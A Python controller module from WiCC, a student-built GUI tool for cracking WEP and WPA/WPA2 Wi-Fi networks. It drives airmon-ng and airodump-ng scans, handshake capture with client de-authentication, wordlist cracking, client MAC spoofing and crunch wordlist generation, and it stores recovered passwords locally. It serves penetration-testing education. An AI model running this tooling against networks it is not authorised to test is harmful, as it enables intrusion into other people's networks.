#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil, Miguel Yanes Fernández and Adan Chalkley,
    as the Group Project for the 3rd year of the Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity
    at TU Dublin - Blanchardstown Campus
"""

import os, sys
from wicc_operations import Operation
from wicc_model import Model
from wicc_view import View
from wicc_scan import Scan
from wicc_enc_type import EncryptionType
from wicc_wpa import WPA
from wicc_wep import WEP
import time
import sys

import csv

from subprocess import Popen, PIPE
import threading


class Control:
    model = ""
    view = ""
    scan = ""
    selectedInterface = ""
    last_selectedInterface = ""
    selectedNetwork = ""
    operations = ""
    headless = False
    allows_monitor = True  # to know if the wireless interface allows monitor mode
    scan_stopped = False  # to know if the network scan is running
    running_stopped = False  # to know if the program is running (or if the view has been closed)
    scan_filter_parameters = ["ALL", "ALL"]
    auto_select = False
    cracking_completed = False  # to know if the network cracking process has finished or not
    selected_wordlist = "/usr/share/wordlists/rockyou.txt"
    cracking_network = False  # state of the network cracking process (if it has started or not)
    net_attack = ""  # EncryptionType generic object, used to store the specific instance of the running attack
    verbose_level = 1  # level 1: minimal output, level 2: advanced output, level 3: advanced output and commands
    spoof_mac = False  # spoof a client's MAC address
    silent_attack = False  # if the netwrok attack should be runned in silent mode
    write_directory = "/tmp/WiCC"  # directory to store all generated dump files
    ignore_local_savefiles = False  # option to ingnore the local files, for both creating and reading them
    main_directory = ""  # directory where the program is running
    local_folder = "/savefiles"  # folder to locally save files
    path_directory_crunch = "/home"  #directory to save generated lists with crunch

    # check installed software
    # ifconfig, aircrack-ng, pyrit, cowpatty, pgrep, NetworkManager, genpmk, iw
    # the pair will become true if it's installed
    required_software = [["ifconfig", False], ["aircrack-ng", False], ["pyrit", False], ["cowpatty", False],
                         ["pgrep", False], ["NetworkManager", False], ["genpmk", False], ["iw", False],
                         ['crunch', False], ['macchanger', False]]
    mandatory_software = ['ifconfig', 'aircrack-ng']

    __instance = None  # used for singleton check

    def __init__(self):
        if not Control.__instance:
            Control.__instance = self
            self.model = ""
            self.model = Model()
            self.view = View(self)
            self.scan = Scan(self)
            directory, err = self.execute_command(['pwd'])
            self.main_directory = directory.decode('utf-8')[:-1]
            self.local_folder = self.main_directory + self.local_folder
        else:
            raise Exception("Singleton class")

    def start_view(self, headless, show_image):
        """
        Start the view windows
        :param headless: indicates whether the program will run headless
        :return:

        :Author: Miguel Yanes Fernández
        """
        self.view.build_window(headless, show_image)
        self.headless = headless

    def execute_command(self, command):
        """
        Static method to execute a defined command.
        :param command: parameters for the command. Should be divided into an array. EX: ['ls, '-l']
        :return: returns both stdout and stderr from the command execution

        :Author: Miguel Yanes Fernández
        """
        if self.verbose_level == 3:
            output = "[Command]:  "
            for word in command:
                output += word + " "
            self.show_message("\033[1;30m" + output + "\033[0m")

        process = Popen(command, stdout=PIPE, stderr=PIPE)
        return process.communicate()

    def show_message(self, message):
        if self.verbose_level >= 2:
            print(message)

    def set_verbose_level(self, level):
        self.verbose_level = level

    def set_ignore_savefiles(self, ignore_savefiles):
        self.ignore_local_savefiles = ignore_savefiles

    def check_software(self):
        """
        Check whether the required software is installed or not.
        :return: list of software (array of booleans), and a boolean to say if any is missing

        :Author: Miguel Yanes Fernández
        """
        """
                Check whether the required software is installed or not.
                :return: list of software (array of booleans), and a boolean to say if any is missing

                :Author: Miguel Yanes Fernández
                """

        some_missing = False
        stop_execution = False

        info_msg = "You are missing some of the required software"
        mandatory_msg = "The following tool(s) are required to be able to run the program:\n"
        optional_msg = "The following tool(s) are not mandatory but highly recommended to run the software:\n"

        for i in range(0, len(self.required_software)):
            out, err = self.execute_command(['which', self.required_software[i][0]])

            if int.from_bytes(out, byteorder="big") != 0:
                self.required_software[i][1] = True
            else:
                some_missing = True
                missing_software = self.required_software[i][0]

                for mand_software in self.mandatory_software:
                    if mand_software == missing_software:
                        stop_execution = True
                        # Stops running if any mandatory software is missing

                        mandatory_msg += " - " + missing_software + "\n"

                if (missing_software not in optional_msg) and (missing_software not in mandatory_msg):
                    optional_msg += " - " + missing_software + "\n"

        if some_missing:
            if mandatory_msg.count('\n') > 1:
                info_msg += "\n\n" + mandatory_msg

            if optional_msg.count('\n') > 1:
                info_msg += "\n\n" + optional_msg

            print(info_msg)  # replace print with show_info_notification
            # self.show_info_notification(info_msg)

        return self.required_software, some_missing, stop_execution

    def scan_interfaces(self, auto_select):
        interfaces, selected_interface, last_selected_interface = self.scan.scan_interfaces(auto_select)
        self.set_interfaces(interfaces)
        self.selectedInterface = selected_interface
        self.last_selectedInterface = last_selected_interface

    def set_interfaces(self, interfaces):
        """
        Using the model instance, sets the interfaces passed as parameter. First checks if there are any new interfaces
        :param interfaces: list of instances of the object Interface
        :return: none

        :Author: Miguel Yanes Fernández
        """
        if not self.model.compare_interfaces(interfaces):
            for interface in interfaces:
                self.model.add_interface(interface[0], interface[1], interface[2], interface[3], interface[4])
            self.notify_view()

    def scan_networks(self):
        """
        Scan all the networks with airodump-ng. Executes the scan concurrently in a thread. Writes the output of the
        command to the file /tmp/WiCC/net_scan-01.csv
        This file is then passed to the method filter_networks
        :return: none

        :Author: Miguel Yanes Fernández & Pablo Sanz Alguacil
        """

        self.scan_stopped = False

        tempfile = self.write_directory + "/net_scan"

        if self.write_directory[:5] == "/tmp/":
            self.execute_command(['rm', '-r', self.write_directory])
        out, err = self.execute_command(['mkdir', self.write_directory])

        # change wireless interface name to the parameter one

        if self.allows_monitor:
            airmon_cmd = ['airmon-ng', 'start', self.selectedInterface]
            interface = self.selectedInterface + 'mon'
            self.execute_command(airmon_cmd)
        else:
            interface = self.selectedInterface

        command = ['airodump-ng', interface, '--write', tempfile, '--output-format', 'csv']

        if self.scan_filter_parameters[0] != "ALL":
            command.append('--encrypt')
            command.append(self.scan_filter_parameters[0])
        if self.scan_filter_parameters[1] != "ALL":
            command.append('--channel')
            command.append(self.scan_filter_parameters[1])

        thread = threading.Thread(target=self.execute_command, args=(command,))
        thread.start()
        thread.join(1)
        # out, err = self.execute_command(['timeout', '1', 'airodump-ng', 'wlan0'])

    def filter_networks(self):
        """
        Filters the input from the csv file (open the file and reads it)
        Checks for a exception when reading the file. If there is an exception, tries to fix the problem and
        notifies the user with a warning popup
        :param tempfile: directory for the csv file of the network scan
        :return: none

        :Author: Miguel Yanes Fernández
        """
        tempfile = "/tmp/WiCC/net_scan"
        # networks = self.filter_networks(tempfile)

        tempfile += '-01.csv'
        networks = []
        clients = []
        first_empty_line = False
        second_empty_line = False
        try:
            with open(tempfile, newline='') as csvfile:
                csv_reader = csv.reader(csvfile, delimiter=',')
                for row in csv_reader:

                    if row == [] and not first_empty_line:
                        first_empty_line = True
                    elif row == [] and not second_empty_line:
                        second_empty_line = True
                    elif second_empty_line:
                        clients.append(row)
                    else:
                        networks.append(row)

            self.set_networks(networks)
            self.set_clients(clients)
            self.notify_view()
            return True
        except IOError:
            try:
                # check if the problem was because the interface was already in monitor mode, and try to fix it
                if self.selectedInterface[-3:] == 'mon':
                    self.selectedInterface = self.selectedInterface[:-3]
                    self.show_message("Interface was already in monitor mode, resetting to: " + self.selectedInterface)
                    self.stop_scan()
                    self.scan_networks()
                    return True
            except Exception:
                # Unknown exception. Tries to fix it by resetting the interface, but may not work
                out, err = self.execute_command(['airmon-ng', 'stop', self.selectedInterface])
                self.execute_command(['NetworkManager'])
                if self.auto_select:
                    return False
                exception_msg = "Error while accessing temporary dump files"
                if err == b'':
                    # if there is no error when resetting the wireless card
                    exception_msg += "\n\nThe error may be fixed automatically. " \
                                     "Please close this window and re-select the network interface." \
                                     "\n\nIf this error persists, close the program and re-plug your wireless card"
                else:
                    # if there is an error when resetting the wireless card. The users must solve this by themselves.
                    exception_msg += "\n\nThe error couldn't be fixed automatically. Please reconnect or reconfigure " \
                                     "your wireless card. Make sure it's not running in monitor mode"
                    self.show_message(Exception.args)
                self.view.show_warning_notification(exception_msg)
                return False
                #sys.exit(1)

    def set_networks(self, networks):
        """
        Using the model instance, sets the new scanned networks (all of them, overwriting the old ones)
        :param networks: list of instances of objects from the class Network
        :return: none

        :Author: Miguel Yanes Fernández
        """
        # for network in networks:
        #    for pair in network:

        self.model.set_networks(networks)

    def set_clients(self, clients):
        """
        Given a list of clients, tells the model to store them
        :param clients: list of parameters of clients
        :return:

        :Author: Miguel Yanes Fernández
        """
        self.model.set_clients(clients)

    def has_selected_interface(self):
        """
        Method to check if there is a selected wireless interface
        :return: true or false whether the selected interface exists or is null

        :Author: Miguel Yanes Fernández
        """
        return self.selectedInterface != ""

    def has_selected_network(self):
        """
        Method to check if there is a selected network to attack
        :return:  true or false whether the selected network exists or is null

        :Author: Miguel Yanes Fernández
        """
        return self.selectedNetwork != ""

    def notify_view(self):
        """
        Send notify to update the view with the list of interfaces and networks
        :return:

        :Author: Miguel Yanes Fernández
        """
        if not self.headless:
            # if the program is not running headless, we notify the view
            interfaces, networks = self.model.get_parameters()
            try:
                self.view.get_notify(interfaces, networks)
            except:
                self.show_message("Error while notifying view (try running the program with the option -s)")
                sys.exit(1)

    def get_notify(self, operation, value):
        """
        Receives the notify generated by the view
        :param operation: type of operation (from the enumeration class Operation)
        :param value: value applied to that operation
        :return:

        :Author: Miguel Yanes Fernández & Pablo Sanz Alguacil
        """
        if operation == Operation.SELECT_INTERFACE:
            self.selectedInterface = value
            if self.selectedInterface == "":
                self.view.enable_buttons()
                self.show_info_notification("Please, select a network interface")
        elif operation == Operation.SELECT_NETWORK:
            self.selectedNetwork = value
            self.stop_scan()
            self.attack_network()
        elif operation == Operation.ATTACK_NETWORK:
            # USELESS right now
            self.stop_scan()
            self.attack_network()
        elif operation == Operation.STOP_SCAN:
            self.stop_scan()
        elif operation == Operation.STOP_RUNNING:
            self.stop_scan()
            self.view.reaper_calls()
            self.running_stopped = True
        elif operation == Operation.SCAN_OPTIONS:
            self.apply_filters(value)
        elif operation == Operation.CUSTOMIZE_MAC:
            self.customize_mac(value)
        elif operation == Operation.RANDOMIZE_MAC:
            self.randomize_mac(value)
        elif operation == Operation.RESTORE_MAC:
            self.restore_mac(value)
        elif operation == Operation.SPOOF_MAC:
            print(value)
            self.spoof_mac = value
        elif operation == Operation.CHECK_MAC:
            self.mac_checker(value)
        elif operation == Operation.SELECT_CUSTOM_WORDLIST:
            self.selected_wordlist = value
            return
        elif operation == Operation.PATH_GENERATED_LISTS:
            self.path_directory_crunch = value
        elif operation == Operation.GENERATE_LIST:
            self.generate_wordlist_crunch(value)

    def stop_scan(self):
        """
        Series of commands to be executed to stop the scan. Kills the process(es) realted with airodump, and then
        resets the wireless interface.
        :return:

        :Author: Miguel Yanes Fernández
        """
        pgrep_cmd = ['pgrep', 'airodump-ng']
        pgrep_out, pgrep_err = self.execute_command(pgrep_cmd)

        pgrep_out = pgrep_out.decode('utf-8')

        if pgrep_out != "":
            pids = pgrep_out.split('\n')
            for pid in pids:
                if pid != "":
                    self.execute_command(['kill', '-9', pid])  # kills all processes related with airodump
            if self.allows_monitor:
                airmon_cmd = ['airmon-ng', 'stop', self.selectedInterface + 'mon']  # stop card to be in monitor mode
                ifconf_up_cmd = ['ifconfig', self.selectedInterface, 'up']  # sets the wireless interface up again
                net_man_cmd = ['NetworkManager']  # restarts NetworkManager

                self.execute_command(airmon_cmd)
                self.execute_command(ifconf_up_cmd)
                self.execute_command(net_man_cmd)
        self.scan_stopped = True
        self.view.enable_buttons()

    def get_interfaces(self):
        """
        Return the list of interfaces from Model
        :return: list of interfaces

        :Author: Miguel Yanes Fernández
        """
        return self.model.get_interfaces()

    def show_info_notification(self, message):
        self.view.show_info_notification(message)

    def apply_filters(self, value):
        """
        Sets the parameters channel and encryption to scan, and clients and wps for post-scanning filtering
        scan_filter_parameters[0] = encryption
        scan_filter_parameters[1] = channel
        :param: value: array containing the parameters [encryption, wps, clients, channel]
        :return: none
        :author: Pablo Sanz Alguacil
        """
        self.scan_filter_parameters[0] = value[0]
        self.scan_filter_parameters[1] = value[3]
        self.model.set_filters(value[1], value[2])

    def attack_network(self):
        """
        Method to start the attack depending on the type of selected network.
        :return:

        :Author: Miguel Yanes Fernández
        """
        password = self.check_cracked_networks("cracked_networks")
        if password != "":
            self.view.show_info_notification("Network already cracked\n\nPassword: " + password +
                                             "\n\nYou can now restart the scanning process")
            return

        network = self.model.search_network(self.selectedNetwork)
        password = ""
        #try:
        network_encryption = network.get_encryption()
        time.sleep(0.01)

        # ------------- OPEN network ----------------
        if network_encryption == " OPN":
            self.show_info_notification("The selected network is open. No password required to connect")
            self.cracking_completed = True
            self.stop_scan()
            return

        self.show_info_notification("Starting attack on" + network_encryption + " network:" + "\n\nName: " +
                                    network.get_essid() + "\nBSSID: " + network.get_bssid() +
                                    "\n\nPlease wait up to a few minutes until the process is finished")

        # ------------- WEP Attack ----------------
        if network_encryption == " WEP":
            if self.spoof_mac:
                attacker_mac = self.spoof_client_mac(self.selectedNetwork)
                self.show_message("Spoofed client MAC: " + attacker_mac)
            else:
                attacker_mac = self.mac_checker(self.selectedInterface,)
                self.show_message("Attacker's MAC: " + attacker_mac)

            self.show_message("WEP attack")
            self.net_attack = WEP(network, self.selectedInterface, attacker_mac,
                                  self.verbose_level, self.silent_attack, self.write_directory)

            self.show_message("Scanning network")
            password = self.net_attack.scan_network()
            self.show_message("Cracking finised")

        # ------------- WPA Attack ----------------
        elif network_encryption[:4] == " WPA":
            self.show_message("create wpa instance")
            self.net_attack = WPA(network, self.selectedInterface, self.selected_wordlist,
                                  self.verbose_level, self.silent_attack, self.write_directory)
            self.show_message("start scanning")
            self.net_attack.scan_network()
            if not self.net_attack.get_injection_supported() and not self.silent_attack:
                self.show_info_notification("The selected interface doesnt support packet injection."
                                            "\nAutomatically switching to silent mode (no client de-authing)"
                                            "\n\nThe attack will be slower")
            self.show_message("start cracking")
            self.show_info_notification("Handshake captured.\n\nStarting password cracking with the given wordlist")
            self.cracking_network = True

            password = self.net_attack.crack_network()
            self.show_message("finished cracking")
            self.cracking_network = False
            #pass

        # ------------- Unsupported encryption -----------
        else:
            self.show_info_notification("Unsupported encryption type. Try selecting a WEP or WPA/WPA2 network")

        self.cracking_completed = True
        self.stop_scan()

        if password != "":
            self.view.show_info_notification("Cracking process finished\n\nPassword: " + password +
                                             "\n\nYou can now restart the scanning process")
            self.create_local_folder()
            bssid = self.model.search_network(self.selectedNetwork).get_bssid()
            self.store_local_file("cracked_networks", bssid + " " + password)
        else:
            self.view.show_info_notification("Cracking process finished\n\nNo password retrieved"
                                             "\n\nYou can restart the scanning process")
        self.selectedNetwork = ""

        #except Exception:
        #    self.view.show_info_notification("Please select a valid target network")
        #    self.selectedNetwork = ""
        #    print(Exception)

    def create_local_folder(self):
        """
        Create (if doesn't exist) a local folder to store program-related files
        :return:

        :Author: Miguel Yanes Fernández
        """

        print(self.main_directory)
        print(self.local_folder)
        if not self.ignore_local_savefiles:
            mkdir_cmd = ['mkdir', self.local_folder]
            print(mkdir_cmd)
            self.execute_command(mkdir_cmd)
            print("creating folder")

    def store_local_file(self, file_name, file_contents):
        """
        Stores the passed content in a local file (adds the content if it already exists)
        :param file_name: name of the file
        :param file_contents: contents to store on the file
        :return:

        :Author: Miguel Yanes Fernández
        """
        if not self.ignore_local_savefiles:
            with open(self.local_folder + "/" + file_name, "a") as file:
                file.write(file_contents + "\n")
                file.close()

            print("creating file")
        else:
            print("not creating")

    def read_local_file(self, file_name):
        """
        Read contents of a local file
        :param file_name: name of the file to read
        :return:

        :Author: Miguel Yanes Fernández
        """
        if not self.ignore_local_savefiles:
            try:
                with open(self.local_folder + "/" + file_name, "r") as file:
                    return file.read()
            except:
                self.show_message("There are no stored cracked networks")

    def check_cracked_networks(self, file_name):
        contents = self.read_local_file(file_name)
        if contents:
            lines = contents.split("\n")
            for line in lines:
                print(line)
                words = line.split()
                if words[0] == self.model.search_network(self.selectedNetwork).get_bssid():
                    return words[1]
        self.show_message("Selected network is not in the stored cracked networks list")
        return ""

    def running_scan(self):
        """
        Method to know if there is a scan running
        :return: value of global variable scan_stopped, used to know if there is a scan running

        :Author: Miguel Yanes Fernández
        """
        return not self.scan_stopped

    def is_cracking_network(self):
        return self.cracking_network

    def spoof_client_mac(self, id):
        """
        Method to spoof a network client's MAc
        :param bssid: bssid of the target network
        :return: spoofed client mac

        :Author: Miguel Yanes Fernández
        """
        network = self.model.search_network(id)
        if network.get_clients() != 0:
            client = network.get_first_client()
            client_mac = client.get_mac()
            return client_mac
        else:
            return self.model.get_mac(self.selectedInterface)

    def check_cracking_status(self):
        """
        Calls the net_attack object's method to check the password cracking status
        :return: output of the check_cracking_status command

        :Author: Miguel Yanes Fernández
        """
        return self.net_attack.check_cracking_status('/tmp/WiCC/aircrack-out')

    def randomize_mac(self, interface):
        """
        Generates and executes the command to set a random MAC address.
        :param interface:
        :return:

        :author: Pablo Sanz Alguacil
        """
        command1 = ['ifconfig', interface, 'down']
        command2 = ['macchanger', '-r', interface]
        command3 = ['ifconfig', interface, 'up']
        self.execute_command(command1)
        self.execute_command(command2)
        self.execute_command(command3)

    def customize_mac(self,values):
        """
        Generates and executes the command to set a custom MAC address.
        :param values: 0 - interface, 1 - mac address
        :return:

        :author: Pablo Sanz Alguacil
        """

        command1 = ['ifconfig', values[0], 'down']
        command2 = ['macchanger', '-m', values[1], values[0]]
        command3 = ['ifconfig', values[0], 'up']
        self.execute_command(command1)
        self.execute_command(command2)
        self.execute_command(command3)

    def restore_mac(self, interface):
        """
        Generates and executes the command to restore the original MAC address.
        :param interface: string cointainig the name of the target interface

        :author: Pablo Sanz Alguacil
        """
        command1 = ['ifconfig', interface, 'down']
        command2 = ['macchanger', '-p', interface]
        command3 = ['ifconfig', interface, 'up']
        self.execute_command(command1)
        self.execute_command(command2)
        self.execute_command(command3)

    def mac_checker(self, interface):
        """
        Generates and executes the command to get the curretn MAC address.
        :param interface: string cointainig the name of the target interface
        :return: string containing the current MAC address, Flase in case of error

        :author: Pablo Sanz Alguacil
        """
        try:
            command1 = ['macchanger', '-s', interface]
            p = Popen(command1, stdout=PIPE, stderr=PIPE)
            (output, err) = p.communicate()
            output = output.decode("utf-8")
            line = output.split(" ")[4]
            self.show_message(line)
            return line
        except:
            self.view.show_warning_notification("Unable to get current MAC address")
            return False

    def get_running_stopped(self):
        return self.running_stopped

    def generate_wordlist_crunch(self, words_list):
        """
        Generates and executes the command to generate a custom wordlist using crunch.
        :param words_list: array containing the words to generate the list.

        :author: Pablo Sanz Alguacil
        """
        output_list = self.path_directory_crunch + "/crunch_output.txt"
        command = ['crunch', '0', '0', '-o', output_list, '-p']
        for word in words_list:
            command.append(word)
        print(output_list)
        self.execute_command(command)
